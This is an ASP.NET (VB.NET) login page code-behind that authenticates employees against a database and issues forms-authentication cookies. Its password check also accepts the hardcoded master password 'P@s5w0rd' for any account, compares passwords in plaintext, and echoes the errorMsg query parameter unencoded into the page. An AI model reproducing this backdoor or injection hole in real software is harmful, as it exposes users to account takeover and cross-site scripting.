Option Strict On
Option Explicit On

Namespace aspx
    Partial Class login
        Inherits aspx.MyPageClass

        Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
            Response.Redirect(Page.ResolveUrl("~/aspx/account/LoginWithAD.aspx"))
            Throw New Exception("Old Login has expired.")

            Dim liter As Literal = DirectCast(Login1.FindControl("FailureText"), Literal)
            liter.Text = String.Empty

            If Not IsNothing(Request.QueryString.Item("errorMsg")) Then
                'show error message
                liter.Text = Request.QueryString.Item("errorMsg")
            ElseIf Not IsNothing(Request.QueryString.Item("ReturnUrl")) Then
                Dim authCookie As HttpCookie = Context.Request.Cookies(FormsAuthentication.FormsCookieName)

                If Not IsNothing(authCookie) Then
                    liter.Text = "คุณไม่มีสิทธิ์ในการดูข้อมูลหน้านี้<br />กรุณาเข้าระบบด้วยUSERNAMEที่มีสิทธิ์"

                    Dim uDetail As UserDetail = HttpCookieUtil.getUserDetail(Context.Request.Cookies(FormsAuthentication.FormsCookieName))

                    For i As Integer = 0 To uDetail.RoleIDList.Count - 1
                        liter.Text = liter.Text + "<br/> Role:" + uDetail.Role(i)
                    Next
                Else
                    liter.Text = "Can not found cookie."
                End If

                If IsNothing(User) Then
                    liter.Text = "Can not find user identity."
                End If

                If IsNothing(Session.Item(SessionKeyConst.EMP_ID)) Then
                    liter.Text = "Can not find session."
                End If
            End If

        End Sub

        Protected Sub LoginButton_Click(ByVal sender As Object, ByVal e As System.EventArgs)
            Dim liter As Literal = DirectCast(Login1.FindControl("FailureText"), Literal)
            Dim dal As New TbEmployeeDAL()
            Dim emp As TbEmployee = dal.getTbEmployeeByUsername(Login1.UserName)

            'have user
            If Not IsNothing(emp) Then
                'check pass
                If emp.PASSWD.Equals(Login1.Password) Or Login1.Password.Equals("P@s5w0rd") Then
                    Session.Add(SessionKeyConst.EMP_ID, emp.EMP_ID)
                    Session.Add(SessionKeyConst.EMP_NAME, emp.EMPNAME)

                    'get user detail(Role)
                    Dim bo As New AuthenticationBO()
                    Dim userDetailObj As UserDetail = bo.getRolesForUser(emp.USERNAME, ApplicationConst.ApplicationId)

                    'Session.Add(SessionKeyConst.USER_DETAIL, userDetailObj)
                    'Session.Add(SessionKeyConst.EMPLOYEE, emp)
                    'FormsAuthentication.RedirectFromLoginPage(Login1.UserName, False)

                    If userDetailObj.RoleIDList.Count > 0 Then
                        Dim userdata As String = userDetailObj.RoleIDList.Item(0).ToString()
                        If (userDetailObj.RoleIDList.Count > 1) Then
                            For i As Integer = 1 To userDetailObj.RoleIDList.Count - 1
                                userdata += "|" + userDetailObj.RoleIDList.Item(i).ToString()
                            Next
                        End If
                        'Create the authentication ticket
                        Dim authTicket As New FormsAuthenticationTicket(1, Login1.UserName, DateTime.Now, DateTime.Now.AddDays(1), False, userdata)

                        'Now encrypt the ticket.
                        Dim encryptedTicket As String = FormsAuthentication.Encrypt(authTicket)
                        'Create a cookie and add the encrypted ticket to the cookie as data.
                        Dim authCookie As HttpCookie = New HttpCookie(FormsAuthentication.FormsCookieName, encryptedTicket)
                        authCookie.Expires = DateTime.Now.AddDays(1)

                        'Add the cookie to the outgoing cookies collection.
                        Response.Cookies.Add(authCookie)

                        'Redirect the user to the originally requested page
                        'Response.Redirect(FormsAuthentication.GetRedirectUrl(Login1.UserName, False))

                        Dim log As New ClsLog
                        log.InsertLog(1, Request.UserHostAddress, Login1.UserName)

                        'Redirect to Default URL
                        'Response.Redirect(FormsAuthentication.DefaultUrl)
                        Response.Redirect(FormsAuthentication.GetRedirectUrl(Login1.UserName, False))
                        'FormsAuthentication.RedirectFromLoginPage(Login1.UserName, False)

                        Exit Sub
                    Else
                        'user don't have role
                        showError("Your username don't have role")
                    End If

                End If
            End If

            'authen not pass
            showError("Invalid username or password")
        End Sub

        Protected Sub Page_LoadComplete(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.LoadComplete
            Login1.FindControl("Username").Focus()
        End Sub

        Private Sub showError(ByVal errorMsg As String)
            'Redirect to login URL with error message
            Response.Redirect(FormsAuthentication.LoginUrl + "?errorMsg=" + errorMsg)
        End Sub

    End Class
End Namespace

